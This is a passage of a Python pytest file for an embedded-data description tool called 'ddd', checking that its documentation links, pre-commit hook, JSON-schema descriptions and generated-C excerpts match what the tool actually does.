        the documentation of another version - ``latest/``, which follows master, or the root,
        which lands on whichever release is newest - send that page's reader to pages of another
        release. The README as the repository writes it links no release at all."""
        source = as_in_the_repository(README)
        wheel = installed_wheel.carried(self.wheel(tmp_path, description=source))
        links = re.findall(LINKED, source)
        assert links, "the README links nothing of the documentation, so this weighs nothing"
        assert installed_wheel.misdirected(wheel, __version__) == [
            "the wheel's description, the release's page on the index, links the documentation "
            f"outside v{__version__}/ {len(links)} times, the first at {links[0]}"
        ]

    def test_one_link_astray_is_named_alone(self, tmp_path: Path) -> None:
        description = f"Its plugins are [there]({DOCS_URL}latest/plugins.html).\n"
        wheel = installed_wheel.carried(self.wheel(tmp_path, description=description))
        assert installed_wheel.misdirected(wheel, __version__) == [
            "the wheel's description, the release's page on the index, links the documentation "
            f"outside v{__version__}/ once, at {DOCS_URL}latest/plugins.html"
        ]

    def test_a_description_linking_nothing_of_the_documentation_is_refused(
        self, tmp_path: Path
    ) -> None:
        """A check that found no link would pass whatever the links were, a description that
        moved them into a header of its own among them."""
        wheel = installed_wheel.carried(self.wheel(tmp_path, description="No link at all.\n"))
        assert installed_wheel.misdirected(wheel, __version__) == [
            f"the wheel's description links nothing of the documentation at {DOCS_URL}"
        ]

    def test_a_wheel_naming_no_documentation_is_refused(self, tmp_path: Path) -> None:
        wheel = installed_wheel.carried(self.wheel(tmp_path, documentation=None))
        assert installed_wheel.misdirected(wheel, __version__) == [
            "the wheel's metadata names no Documentation url, which the links of its "
            "description are held to"
        ]

    def test_the_checker_says_what_it_holds_the_description_to(self) -> None:
        said = flattened(installed_wheel.__doc__ or "")
        assert (
            "the wheel's ``Documentation`` url, which the index shows beside the description, is "
            "the documentation of ``v<version>/``, and the description, which the index shows as "
            "the release's page, links the documentation under it alone, as Publish's build points "
            "them both"
        ) in said


class TestPreCommitHook:
    """The hook definition this repository publishes for projects that use ddd.

    It is consumed by *other* repositories - they name this one in their
    ``.pre-commit-config.yaml`` and get the hook - so nothing here exercises it end to end.
    What is checked is the part that would rot silently: an entry naming a command or a flag
    this tool no longer has fails in somebody else's commit, weeks later, with an error that
    points at their config rather than at this file.
    """

    def hook(self) -> dict[str, str]:
        """The single hook's fields, read without a yaml parser.

        The file is a handful of ``key: value`` lines under one list entry, and adding a yaml
        dependency to the test requirements to read it would be a larger commitment than the
        thing being read - the dev requirements already argue against a dependency a test can
        skip on.
        """
        text = (ROOT / ".pre-commit-hooks.yaml").read_text(encoding="utf-8")
        fields = {}
        for line in text.splitlines():
            stripped = line.lstrip("- ").strip()
            if ": " in stripped and not stripped.startswith("#"):
                key, value = stripped.split(": ", 1)
                fields[key.strip()] = value.strip().strip("'\"")
        return fields

    def test_the_entry_names_a_command_this_tool_offers(self) -> None:
        entry = self.hook()["entry"].split()
        assert entry[0] == "ddd"
        # Parsed by the real parser: a renamed command or a dropped flag fails here rather
        # than in a consuming project's commit hook.
        parsed = _build_parser().parse_args([*entry[1:], "a.ddd.json"])
        assert parsed.handler is not None

    def test_it_is_offered_the_files_it_can_act_on(self) -> None:
        pattern = self.hook()["files"]
        assert re.search(pattern, "components/controller.ddd.json")
        assert not re.search(pattern, "src/main.c")
        assert not re.search(pattern, "package.json")

    def test_it_installs_this_package(self) -> None:
        """``language: python`` is what makes pre-commit build the hook from this repository.

        Any other language would have it look for a ``ddd`` already on the consuming project's
        path, which is the one thing pinning the hook to a ``rev`` is meant to avoid.
        """
        assert self.hook()["language"] == "python"


WHOLE_NUMBER_KEYS = [
    ("component", "Measurement", "dimensions"),
    ("component", "ValueBlock", "dimensions"),
    ("component", "Member", "dimensions"),
    ("component", "Axis", "size"),
    ("component", "Enumerator", "value"),
    ("rasters", "RasterDeclaration", "event"),
    ("sections", "SectionDeclaration", "alignment"),
]
"""Every key the loader reads as a strict integer, which no json schema can say.

``integer`` in json schema admits a zero fraction, so an editor bound to the schema accepts
``4.0`` where ``ddd check`` says "Input should be a valid integer". The file formats index
says a rule a constraint cannot carry is written into the description of the key it hangs
off instead; these are the keys it hangs off.
"""


REFUSED_BUT_NOT_BY_A_CONSTRAINT = [
    ("types", "ExternalType", "header", "no whitespace"),
    ("component", "ExternalType", "header", "no whitespace"),
    ("rasters", "RasterDeclaration", "cycle", "1 to 255 times a decade"),
    ("component", "EnumConversion", "enumerators", "may not carry the same name"),
    ("component", "Measurement", "unit", "Refused beside a ``string``"),
    ("component", "Measurement", "limits", "Refused beside a ``string``"),
    ("component", "A2lObjectOptions", "format", "Refused beside a ``string``"),
]
"""Four rules the loader enforces in python, with the phrase each description carries.

An editor bound to the schema accepts what the loader then refuses - a header spelled
``"a b.h"``, a ``cycle`` of ``1234ms``, one enumerator name twice, a ``unit`` beside a
string - so the description of the key says the rule, which is what the file formats index
promises a reader of a key that no constraint can express.
"""


class TestTheRuleAJsonSchemaCannotCarry:
    @pytest.mark.parametrize(("kind", "model", "key"), WHOLE_NUMBER_KEYS)
    def test_a_strict_integer_key_says_it_is_written_without_a_point(
        self, kind: str, model: str, key: str
    ) -> None:
        described = published(kind)["$defs"][model]["properties"][key]["description"]
        assert "without a decimal point" in described, described

    @pytest.mark.parametrize(("kind", "model", "key", "phrase"), REFUSED_BUT_NOT_BY_A_CONSTRAINT)
    def test_a_key_the_loader_polices_says_what_it_refuses(
        self, kind: str, model: str, key: str, phrase: str
    ) -> None:
        described = published(kind)["$defs"][model]["properties"][key]["description"]
        assert phrase in described, described


class TestToolbox:
    """The findings of ddd tool from-elf, held to the one table of them: each is named in the
    user guide and in the specification, as every check of the catalogue is."""

    GUIDE = PAGES["docs/toolbox.rst"]

    @pytest.mark.parametrize("finding", sorted(FINDINGS))
    def test_every_finding_of_the_tool_is_named_in_the_guide(self, finding: str) -> None:
        assert f"``{finding}``" in self.GUIDE

    @pytest.mark.parametrize("finding", sorted(FINDINGS))
    def test_every_finding_of_the_tool_is_named_in_the_spec(self, finding: str) -> None:
        assert f"`{finding}`" in SPEC

    @pytest.mark.parametrize(("finding", "severity"), sorted(FINDINGS.items()))
    def test_the_guide_gives_every_finding_the_severity_the_tool_reports_it_with(
        self, finding: str, severity: str
    ) -> None:
        """A finding's severity decides the exit status; the guide is where a user reads it."""
        assert f"   * - ``{finding}``\n     - {severity}\n" in self.GUIDE

    def test_both_pages_state_that_only_a_full_width_constant_of_a_signed_enum_is_negative(
        self,
    ) -> None:
        """The reader sign-extends an enumerator only for a signed enum, from a constant as
        wide as the enum; an unsigned enum's 200, or a signed one's, is the value it holds."""
        spec = " ".join(SPEC.split())
        guide = " ".join(self.GUIDE.split())
        assert (
            "Only an enumerator of a signed enum, written as a fixed-width constant as wide as "
            "the enum, with its top bit set, is negative" in spec
        )
        assert (
            "An enumerator of a signed enum is negative only where its fixed-width constant is "
            "as wide as the enum and its top bit is set" in guide
        )
        for text in (spec, guide):
            assert "whether its form is narrower or wider than the enum" in text


class TestWhatIsDetectedAndWhatIsNot:
    """A shared type and a restated definition trade detection against one edit, and the pages
    say so in one voice: the check compares descriptions, never a description with code."""

    CONCEPT = flattened(PAGES["docs/concept.rst"])
    FAQ = flattened(PAGES["docs/faq.rst"])
    TYPES = flattened(PAGES["docs/file_formats/types.rst"])
    TEMPLATES = flattened(PAGES["docs/templates.rst"])
    README_TEXT = flattened(README)
    SPEC_TEXT = flattened(SPEC)
    EDITOR = flattened(EDITOR_INTEGRATION)

    def test_the_concept_page_says_the_check_compares_descriptions_and_never_code(self) -> None:
        assert (
            "``ddd check`` compares **descriptions**. It never compares a description with code"
            in self.CONCEPT
        )

    def test_the_concept_page_says_a_rescaled_type_is_one_edit_no_reader_shows(self) -> None:
        assert "The rescale is one edit that no reader's description shows" in self.CONCEPT
        assert "``ddd compare`` against a baseline dump archived before the change" in self.CONCEPT

    def test_the_concept_page_says_the_restated_definition_is_what_the_check_sees(self) -> None:
        assert (
            "This redundancy is what lets ``ddd check`` see the two sides drift apart. It does "
            "not reach the code" in self.CONCEPT
        )

    def test_the_concept_page_says_reconciling_leaves_the_code_alone(self) -> None:
        assert (
            "The descriptions agree afterwards, and the code that reads the variable is "
            "untouched" in self.CONCEPT
        )

    def test_the_concept_page_no_longer_says_a_shared_declaration_could_never_notice(self) -> None:
        assert "which a single shared declaration could never do" not in self.CONCEPT
        assert "which a shared type, naming the meaning once, trades away" in self.CONCEPT

    def test_one_edit_in_one_file_is_said_of_a_shared_type_only(self) -> None:
        assert (
            "Changing the scaling is one edit in one file when the variables name a shared type"
            in self.CONCEPT
        )
        assert "one edit in each declaring file when each restates its definition" in self.CONCEPT

    def test_the_faq_says_what_a_shared_type_costs(self) -> None:
        assert (
            "there is nothing left for them to disagree about, which is also what it costs: "
            "``ddd check`` cannot see two descriptions drift apart when there is one" in self.FAQ
        )

    def test_the_types_page_says_the_check_is_given_up(self) -> None:
        assert "It is also a check given up" in self.TYPES

    def test_the_readme_says_a_shared_type_cannot_be_seen_to_rescale(self) -> None:
        assert "`ddd check` cannot see a rescale of the type" in self.README_TEXT

    def test_the_quick_fix_pages_say_the_readers_code_is_not_touched(self) -> None:
        assert "the code of the readers is not touched" in self.README_TEXT
        assert "the code of the components that read the variable is not touched" in self.EDITOR
        assert "never the code of the components that read the variable" in self.SPEC_TEXT

    def test_the_spec_and_the_templates_page_say_what_the_example_header_writes(self) -> None:
        assert "a rescale changes the header every reader includes" in self.SPEC_TEXT
        assert "#define Speed__FACTOR (0.1)" in self.TEMPLATES
        assert "#define Speed__OFFSET (-40.0)" in self.TEMPLATES
        assert "The example writes nothing for any other kind of conversion" in self.TEMPLATES


class TestTheSmallSentencesOfTheTemplateAndArtefactsPages:
    """What the pages say of the literals, the sections, the include guard, the linear
    conversion and the compu method names, each held to the code that does it."""

    TEMPLATES = flattened(PAGES["docs/templates.rst"])
    ARTEFACTS = flattened(PAGES["docs/generated_artefacts.rst"])
    DICTIONARY = flattened(PAGES["docs/data_dictionary.rst"])
    SPEC_TEXT = flattened(SPEC)

    @pytest.mark.parametrize(
        "value",
        [
            -2147483648,
            2147483647,
            2147483648,
            4294967295,
            -2147483649,
            -9223372036854775808,
            18446744073709551615,
        ],
    )
    def test_the_templates_page_names_the_literal_each_value_renders_as(self, value: int) -> None:
        from ddd.backends.c.literals import c_constant_literal

        assert f"``{c_constant_literal(value)}``" in self.TEMPLATES

    def test_the_templates_page_says_the_literal_depends_on_the_range_alone(self) -> None:
        assert "depends on the value's range alone" in self.TEMPLATES
        assert "although an ``unsigned int`` holds it" in self.TEMPLATES
        assert "is the unary minus applied to ``2147483648``" in self.TEMPLATES

    def test_the_templates_page_no_longer_calls_the_literal_the_narrowest_type(self) -> None:
        assert "The two differ only at the ends" not in self.TEMPLATES
        assert "narrowest type that holds it" not in self.TEMPLATES

    def test_the_templates_page_says_an_object_states_the_enum_the_types_header_declares(
        self,
    ) -> None:
        assert (
            "the enum's entries in ``model.enums``, so an object whose own copy documents less "
            "states the copy the types header declares"
        ) in self.TEMPLATES

    def test_the_templates_page_says_a_placed_object_is_in_both_lists(self) -> None:
        assert "A placed object is in its component's group as well" in self.TEMPLATES
        assert "defines it twice" in self.TEMPLATES
        assert "Objects without a ``section`` are not here" not in self.TEMPLATES

    def test_the_templates_page_says_an_underscore_at_the_edge_of_a_name_stays_in_the_guard(
        self,
    ) -> None:
        from ddd.backends.c.literals import component_guard, guard_name

        for name in ("Valve_", "_valve", "_valve_"):
            assert f"``{component_guard(name)}``" in self.TEMPLATES
        assert "No guard holds a double underscore" in self.TEMPLATES
        assert "``DDD_COMPONENT_VALVE__H``" not in self.TEMPLATES
        assert guard_name("a-", "b") == "A_B_H"
        assert "the underscores at either end are dropped" in self.TEMPLATES
        assert "is kept, the ones at its edges" not in self.TEMPLATES

    def test_a_double_underscore_is_said_to_be_reserved_by_cplusplus(self) -> None:
        """C reserves a name that begins with two underscores, or with one and a capital, and
        C++ one that holds two anywhere, which is what a guard and the scale macros meet."""
        from ddd.backends.c.literals import component_guard

        said = "No guard holds a double underscore, which C++ reserves wherever it stands"
        assert said in self.TEMPLATES
        assert "which c reserves" not in self.TEMPLATES
        assert "which C++ reserves wherever it stands" in flattened(component_guard.__doc__ or "")
        assert "which c reserves" not in (component_guard.__doc__ or "")
        assert (
            "The names are sound C, which reserves a name that begins with two underscores, or "
            "with one and a capital letter, but not one that holds two further in. C++ reserves "
            "that too, so a C++ unit including the header meets ``Speed__FACTOR`` as a name "
            "reserved to the implementation"
        ) in self.TEMPLATES
        assert "renames the macros in the two lines of the ``scale`` macro" in self.TEMPLATES

    @pytest.mark.parametrize("text", ["SPEC_TEXT", "ARTEFACTS"])
    def test_the_linear_conversion_is_said_to_be_a_choice_against_the_standard(
        self, text: str
    ) -> None:
        page = getattr(self, text)
        assert "``LINEAR``" in page.replace("`LINEAR`", "``LINEAR``")
        assert "``RAT_FUNC``" in page.replace("`RAT_FUNC`", "``RAT_FUNC``")
        assert "ASAP2 1.6.1" in page
        assert "is not an option of the tool" in page
        assert "states a linear function exactly" not in page
        assert "keeps the type of its methods" in page
        assert "a choice" in page

    @pytest.mark.parametrize("text", ["SPEC_TEXT", "ARTEFACTS"])
    def test_the_unsuffixed_name_is_said_to_go_to_the_first_record_of_the_file(
        self, text: str
    ) -> None:
        page = getattr(self, text)
        assert "whose record the file writes first" in page
        assert "then the other calibration objects, curves and maps among them" in page
        assert "before the member paths" not in page

    def test_the_dictionary_page_names_no_keyword_the_format_lacks(self) -> None:
        assert "LOWER_LIMIT" not in self.DICTIONARY
        assert "UPPER_LIMIT" not in self.DICTIONARY
        assert "read from one field" not in self.DICTIONARY
        assert "``MATRIX_DIM`` from ``shape``" in self.DICTIONARY
        assert "writes the array from ``dimensions``" in self.DICTIONARY


class TestWhatThePagesSayOfTheFieldASizeIsNamedBy:
    """A size past 65,535 is named by the field its record writes. A string measurement stays
    the byte array it is, with a ``MATRIX_DIM``; only a string characteristic has a
    ``NUMBER``; and a string member, named once at its type, reaches both."""

    @pytest.mark.parametrize(
        ("text", "tick"),
        [(flattened(SPEC), "`"), (flattened(CONSISTENCY_CHECKS), "``")],
        ids=["SPEC", "the check reference"],
    )
    def test_spec_and_the_check_reference_name_the_records_field(
        self, text: str, tick: str
    ) -> None:
        assert (
            f"the {tick}MATRIX_DIM{tick} of an array, a string measurement's among them, the "
            f"{tick}NUMBER{tick} of a string characteristic"
        ) in text
        assert "the finding names the field the record writes" in text
        assert "a string member naming both of its fields" in text
        assert f"the {tick}NUMBER{tick} of a string and" not in text


C_BLOCK = re.compile(r"^(?:\.\. code-block:: c|```c)$")
CAPTION = re.compile(r"^/\* ([\w./]+?\.[ch])\b[^*]*\*/$")
"""A comment opening an excerpt that names the file it is of: ``/* ddd_globals.c */``, or
``/* Controller.h, shortened - ... */``. A generated file opens with a banner of its own, whose
first line is ``/*`` alone, so no generated line reads as one."""


def c_blocks(page: str) -> list[list[str]]:
    """Every block of c a page shows, dedented, without the blank lines at its ends."""
    lines = PAGES[page].splitlines()
    found: list[list[str]] = []
    for number, text in enumerate(lines):
        if not C_BLOCK.match(text.strip()):
            continue
        body: list[str] = []
        for line in lines[number + 1 :]:
            if text.startswith("```"):
                if line.startswith("```"):
                    break
                body.append(line)
            elif line.strip() and not line.startswith("   "):
                break
            else:
                body.append(line[3:])
        while body and not body[0].strip():
            body.pop(0)
        while body and not body[-1].strip():
            body.pop()
        found.append([line.rstrip() for line in body])
    return found


def without_version(line: str) -> str:
    """A banner names the version that wrote the file, which a page shows as it was then."""
    return re.sub(r"\bddd \d+\.\d+\.\d+\b", "ddd VERSION", line)


class Excerpt(NamedTuple):
    """One block of c a page shows as the example templates' output, and the run it is held to.

    ``opening`` is the block's first lines, which tell it from the page's other blocks. ``file``
    is the file of the run it is from, or nothing where the block's own caption comments name
    it. ``held`` is how much of the file it shows: ``whole``, a ``slice`` of consecutive lines,
    or ``shortened``, its lines in the file's order with some left out - a declaration never
    without the scale macros that follow it.
    """

    page: str
    opening: tuple[str, ...]
    project: str
    file: str | None
    held: Literal["whole", "slice", "shortened"]


GETTING_STARTED = "docs/getting_started.rst"
ARTEFACTS_PAGE = "docs/generated_artefacts.rst"
VARIABLES_PAGE = "docs/file_formats/variable_definition.rst"
RULE = "/* " + "-" * 75

EXCERPTS: tuple[Excerpt, ...] = (
    Excerpt(GETTING_STARTED, ("/*", " * ddd_globals.c"), "thermostat", "ddd_globals.c", "whole"),
    Excerpt(GETTING_STARTED, ("/*", " * SensorHub.h"), "thermostat", "SensorHub.h", "whole"),
    Excerpt(GETTING_STARTED, ("/*", " * Controller.h"), "thermostat", "Controller.h", "whole"),
    Excerpt(ARTEFACTS_PAGE, ("/*", " * ddd_types.h"), "demo", "ddd_types.h", "whole"),
    Excerpt(
        ARTEFACTS_PAGE,
        (RULE, " * Controller - Consumes the raw values and produces the derived ones"),
        "demo",
        "ddd_globals.c",
        "slice",
    ),
    Excerpt(
        ARTEFACTS_PAGE,
        ("/*", " * Interface of software component 'UserInterface'."),
        "demo",
        "UserInterface.h",
        "slice",
    ),
    Excerpt(ARTEFACTS_PAGE, ("#if defined(FEATURE_X)",), "demo", "ddd_globals.c", "slice"),
    Excerpt(ARTEFACTS_PAGE, ("/*", " * ddd_globals.c"), "demo", "ddd_globals.c", "slice"),
    Excerpt(
        "README.md",
        ("/* ddd_globals.c, as the example templates render it */",),
        "demo",
        None,
        "slice",
    ),
    Excerpt(
        "README.md",
        ("/* UserInterface.h - only what UserInterface declared */",),
        "demo",
        None,
        "slice",
    ),
    Excerpt(
        "docs/concept.rst",
        ("/* Controller.h, shortened - the whole file has the same three sections */",),
        "demo",
        None,
        "shortened",
    ),
    Excerpt(
        "docs/file_formats/component.rst",
        ("/* outputs - written by Controller, read by other components */",),
        "demo",
        "Controller.h",
        "shortened",
    ),
    Excerpt(
        "docs/file_formats/component.rst",
        ("#if defined(FEATURE_X)",),
        "demo",
        "ddd_globals.c",
        "slice",
    ),
    Excerpt(
        "docs/faq.rst",
        ("/* ddd_globals.c */", "DDD_RETAIN uint16_t ValueD[8];"),
        "demo",
        None,
        "slice",
    ),
    Excerpt(
        "docs/faq.rst",
        ("/* ddd_globals.c */", "DDD_RETAIN int16_t InletTemperature = -400;"),
        "storage",
        None,
        "slice",
    ),
    Excerpt("docs/file_formats/constants.rst", ("/* ddd_types.h */",), "vocabulary", None, "slice"),
    Excerpt(
        "docs/file_formats/conversions.rst", ("/* Level_t */",), "enums", "ddd_types.h", "slice"
    ),
    Excerpt(
        "docs/file_formats/conversions.rst",
        ("/** Software label of the controller, as text (calibration value block) */",),
        "demo",
        "ddd_globals.c",
        "slice",
    ),
    Excerpt(
        "docs/file_formats/sections.rst",
        ('DDD_RETAIN volatile uint16_t Speed __attribute__((section(".fast_ram")));',),
        "sections",
        "ddd_globals.c",
        "shortened",
    ),
    Excerpt(
        "docs/file_formats/types.rst",
        ("#include <stdint.h>",),
        "structures",
        "ddd_types.h",
        "slice",
    ),
    Excerpt(
        "docs/file_formats/types.rst",
        ("/* Sample_t - One reading and the instant it was taken */",),
        "structures",
        "ddd_types.h",
        "shortened",
    ),
    Excerpt(
        "docs/file_formats/types.rst",
        ("/** The inlet sensor as this ecu sees it */",),
        "structures",
        "ddd_globals.c",
        "shortened",
    ),
    *(
        Excerpt(VARIABLES_PAGE, opening, "demo", "ddd_globals.c", "slice")
        for opening in (
            ("/** Floating point measurement without a conversion [degC] */",),
            (
                "/** Second calibratable curve over the same shared axis [%] (calibration curve "
                "over AxisA) */",
            ),
            ("/** Array measurement with four elements [V] */",),
            (
                "/** Single calibratable constant [Hz] (calibration parameter) */",
                "DDD_RETAIN const uint16_t ParameterA = 3200U;",
            ),
            ("/** Calibratable array of constants (calibration value block) */",),
            ("/** Shared axis indexed by ValueE [Hz] (calibration axis, 6 points) */",),
            ("/** Calibratable curve over AxisA [ms] (calibration curve over AxisA) */",),
            (
                "/** Calibratable map over AxisA and AxisB [%] (calibration map over AxisA and "
                "AxisB) */",
            ),
        )
    ),
)
"""Every block of c a page shows as what the example templates write, with the run it is of.

The demo, ``examples/structures`` and ``examples/vocabulary`` are shipped; the thermostat is
the tutorial's own, written from its page as its reader writes it. Three are projects a page
describes without shipping, built below as the page tells them: ``storage``, the two sensors
of the FAQ's ``storage-mismatch``; ``sections``, the sections page's ``Speed`` and a ``Gain``;
and ``enums``, the two spellings of an enum the conversions page shows."""

ILLUSTRATIONS: tuple[tuple[str, tuple[str, ...]], ...] = (
    # A flat table's declaration, its initialiser elided.
    (
        "docs/data_dictionary.rst",
        ("DDD_RETAIN const uint32_t M[2 + (16) * (16)] = { 16U, 16U, ... };",),
    ),
    # One line of each of two images' headers, of projects the page describes.
    ("docs/faq.rst", ("/* build/full/Controller.h */",)),
    # The better documented of two copies of an enum, the components left to the reader.
    ("docs/file_formats/conversions.rst", ("typedef enum",)),
    # The demo's ParameterA as it would be with "volatile": true.
    (
        VARIABLES_PAGE,
        (
            "/** Single calibratable constant [Hz] (calibration parameter) */",
            "DDD_RETAIN const volatile uint16_t ParameterA = 3200U;",
        ),
    ),
    # The four ways the two qualifiers compose, each labelled.
    (
        ARTEFACTS_PAGE,
        ('volatile uint16_t Speed;            /* measurement, "volatile": true  */',),
    ),
    # A declaration of c, for the order of its indices.
    (ARTEFACTS_PAGE, ("uint8_t Table[2][3];",)),
)
"""The blocks of c a page shows that are not a run's output, each with why."""


def interface(name: str, *entries: tuple[str, dict[str, Any]]) -> dict[str, Any]:
    """A component description, each entry a scope and a definition."""
    return {
        "component": {
            "name": name,
            "interface": [{"scope": scope, "definition": entry} for scope, entry in entries],
        }
    }


INLET_TEMPERATURE: dict[str, Any] = {
    "name": "InletTemperature",
    "kind": "measurement",
    "datatype": "sint16",
    "unit": "degC",
    "conversion": {"factor": 0.1},
    "volatile": False,
}

STORAGE_PROJECT: dict[str, Any] = {
    "device.ddd.json": {
        "project": {"name": "Device", "includes": ["sensor_hub.ddd.json", "controller.ddd.json"]}
    },
    "sensor_hub.ddd.json": interface(
        "SensorHub",
        ("output", {**INLET_TEMPERATURE, "init": -400, "a2l": {"format": "%5.1"}}),
    ),
    "controller.ddd.json": interface(
        "Controller", ("input", {**INLET_TEMPERATURE, "a2l": {"format": "%8.3"}})
    ),
}
"""The FAQ's two sensors: one variable whose two declarations disagree about its a2l format."""

SECTIONS_PROJECT: dict[str, Any] = {
    "p.ddd.json": {"project": {"name": "P", "includes": ["s.ddd.json", "a.ddd.json"]}},
    "s.ddd.json": {
        "sections": [
            {"section": ".fast_ram", "access": "read-write", "alignment": 4},
            {"section": ".calib", "access": "read-only", "alignment": 4},
        ]
    },
    "a.ddd.json": interface(
        "A",
        (
            "output",
            {
                "name": "Speed",
                "kind": "measurement",
                "datatype": "uint16",
                "conversion": {},
                "volatile": True,
                "section": ".fast_ram",
            },
        ),
        (
            "local",
            {
                "name": "Gain",
                "kind": "parameter",
                "datatype": "uint32",
                "conversion": {},
                "init": 3,
                "volatile": False,
                "section": ".calib",
            },
        ),
    ),
}
"""The sections page's ``Speed`` as its block shows it, and a ``Gain`` in ``.calib``."""


def level(name: str, value: int, description: str) -> dict[str, Any]:
    return {"name": name, "value": value, "description": description}


ENUMS_PROJECT: dict[str, Any] = {
    "p.ddd.json": {"project": {"name": "P", "includes": ["a.ddd.json"]}},
    "a.ddd.json": interface(
        "A",
        (
            "local",
            {
                "name": "Mode",
                "kind": "measurement",
                "description": "Short form",
                "datatype": "uint8",
                "conversion": {
                    "kind": "enum",
                    "name": "Mode_t",
                    "enumerators": {"MODE_OFF": 0, "MODE_RUN": 1, "MODE_FAULT": 15},
                },
                "volatile": False,
            },
        ),
        (
            "local",
            {
                "name": "Level",
                "kind": "measurement",
                "description": "Long form",
                "datatype": "uint8",
                "conversion": {
                    "name": "Level_t",
                    "enumerators": [
                        level("LEVEL_LOW", 0, "below the working range"),
                        level("LEVEL_OK", 1, "inside the working range"),
                        level("LEVEL_HIGH", 2, "above the working range"),
                    ],
                },
                "volatile": False,
            },
        ),
    ),
}
"""The conversions page's two spellings of an enum, as its blocks show them."""


@pytest.fixture(scope="module")
def runs(tmp_path_factory: pytest.TempPathFactory) -> dict[str, dict[str, list[str]]]:
    """The c the example templates write for every project an excerpt is of, once per run of
    this module, each file as its lines, the version in its banner left out."""
    from conftest import TEMPLATES, write_tree
    from test_transcripts import written_files

    root = tmp_path_factory.mktemp("generated-c")
    tutorial = written_files(ROOT / GETTING_STARTED)
    projects = {
        "demo": DEMO,
        "structures": ROOT / "examples" / "structures" / "project.ddd.json",
        "vocabulary": ROOT / "examples" / "vocabulary" / "project.ddd.json",
        "thermostat": write_tree(root / "thermostat", tutorial) / "thermostat.ddd.json",
        "storage": write_tree(root / "storage", STORAGE_PROJECT) / "device.ddd.json",
        "sections": write_tree(root / "sections", SECTIONS_PROJECT) / "p.ddd.json",
        "enums": write_tree(root / "enums", ENUMS_PROJECT) / "p.ddd.json",
    }
    found: dict[str, dict[str, list[str]]] = {}
    for name, project in projects.items():
        output = root / name / "gen"
        printed = io.StringIO()
        with contextlib.redirect_stderr(printed), contextlib.redirect_stdout(printed):
            arguments = ["generate", "c", str(project), "-o", str(output), "-t", str(TEMPLATES)]
            status = main(arguments)
        assert status == EXIT_OK, printed.getvalue()
        found[name] = {
            path.name: path.read_text(encoding="utf-8")
            .replace(f"ddd {__version__}", "ddd VERSION")
            .splitlines()
            for path in sorted(output.iterdir())
            if path.suffix in (".c", ".h")
        }
    return found


class TestTheGeneratedCThePagesShow:
    """Every excerpt of generated c a page shows is held to a run of the project it is from.

    Three kinds of line drifted while no test read them: the ``DDD_RETAIN`` the example
    definition template writes before each definition, the scale macros its component header
    writes after a linear input or output, and the comment the definition file opens with. A
    page holding the file whole holds every line of it; a slice holds consecutive lines; a
    shortened excerpt holds lines in the file's order, and a declaration it shows is followed
    by the macros that follow it in the file.
    """

    @staticmethod
    def parts(excerpt: Excerpt, block: list[str]) -> list[tuple[str, list[str]]]:
        """The block cut at the captions naming a file, each part with the file it is of."""
        parts: list[tuple[str | None, list[str]]] = [(excerpt.file, [])]
        for line in block:
            caption = CAPTION.match(line)
            if caption:
                parts.append((caption.group(1), []))
            else:
                parts[-1][1].append(without_version(line))
        found: list[tuple[str, list[str]]] = []
        for file, lines in parts:
            while lines and not lines[-1]:
                lines.pop()
            if lines:
                assert file is not None, f"{excerpt.page}: {excerpt.opening[0]!r} names no file"
                found.append((file, lines))
        return found

    @staticmethod
    def problem(held: str, shown: list[str], file: list[str]) -> str | None:
        """What is wrong with ``shown`` as an excerpt of ``file``, or nothing."""
        if held == "whole":
            return None if shown == file else "is not the whole file"
        if held == "slice":
            width = len(shown)
            if any(file[at : at + width] == shown for at in range(len(file) - width + 1)):
                return None
            return "is no run of lines of it"
        position = 0
        for index, line in enumerate(shown):
            try:
                position = file.index(line, position) + 1
            except ValueError:
                return f"has {line!r}, which the file has not got there"
            if line.startswith("extern "):
                after = file[position:]
                macros = list(itertools.takewhile(lambda text: text.startswith("#define "), after))
                if shown[index + 1 : index + 1 + len(macros)] != macros:
                    return f"shows {line!r} without the macros after it: {macros}"
        return None

    @staticmethod
    def opens(block: list[str], opening: tuple[str, ...]) -> bool:
        return tuple(block[: len(opening)]) == opening

    def located(self, excerpt: Excerpt) -> list[str]:
        blocks = [block for block in c_blocks(excerpt.page) if self.opens(block, excerpt.opening)]
        assert len(blocks) == 1, f"{excerpt.page}: {len(blocks)} blocks of c open {excerpt.opening}"
        return blocks[0]

    @pytest.mark.parametrize(
        "excerpt", EXCERPTS, ids=lambda excerpt: f"{excerpt.page}: {excerpt.opening[-1][:40]}"
    )
    def test_each_excerpt_is_what_the_run_writes(
        self, excerpt: Excerpt, runs: dict[str, dict[str, list[str]]]
    ) -> None:
        for file, shown in self.parts(excerpt, self.located(excerpt)):
            written = runs[excerpt.project][file]
            problem = self.problem(excerpt.held, shown, written)
            assert problem is None, (
                f"{excerpt.page}: the excerpt of {file} {problem}; the run of {excerpt.project} "
                f"writes:\n" + "\n".join(written)
            )

    def test_every_block_of_c_on_a_page_is_held_or_said_to_be_an_illustration(self) -> None:
        """A new excerpt has to join one list or the other, so that none is shown unread."""
        claimed = [(excerpt.page, excerpt.opening) for excerpt in EXCERPTS] + list(ILLUSTRATIONS)
        loose = [
            (page, block[0])
            for page in PAGES
            for block in c_blocks(page)
            if sum(page == owner and self.opens(block, opening) for owner, opening in claimed) != 1
        ]
        assert not loose, f"blocks of c held by no excerpt and called no illustration: {loose}"


class TestEveryShownRunThatDefaultsTheByteOrderSaysSo:
    """A run that writes an a2l with neither ``--byte-order`` nor an image prints the info
    ``byte-order-defaulted`` and counts it, so a page showing one shows that too. The runs a
    page shows and the documentation tests do not re-run are held here, since nothing else
    reads them: seven of them had kept the output of the runs before the info."""

    COUNT = re.compile(r"^\d+ (?:errors?|warnings?|infos?)(?:, \d+ (?:errors?|warnings?|infos?))*$")

    @staticmethod
    def defaulting() -> list[Any]:
        from test_transcripts import PAGES as TRANSCRIBED
        from test_transcripts import transcripts

        found = []
        for page in TRANSCRIBED:
            for transcript in transcripts(page):
                words = transcript.command.split()
                if words[:2] != ["ddd", "generate"] or words[2] not in ("all", "a2l"):
                    continue
                if any(option in words for option in ("--byte-order", "--image", "--without")):
                    continue
                if (
                    not transcript.shown
                    or transcript.shown[0].strip() == "..."
                    or (transcript.shown[0].startswith("ddd: "))
                ):
                    continue  # a page leaving the findings out, or a usage error, which has none
                found.append(transcript)
        return found

    def test_the_runs_are_found(self) -> None:
        assert len(self.defaulting()) >= 15

    def test_each_shows_the_info_and_counts_it(self) -> None:
        wrong = []
        for transcript in self.defaulting():
            counts = [line for line in transcript.shown if self.COUNT.match(line.strip())]
            says = any("info[byte-order-defaulted]" in line for line in transcript.shown)
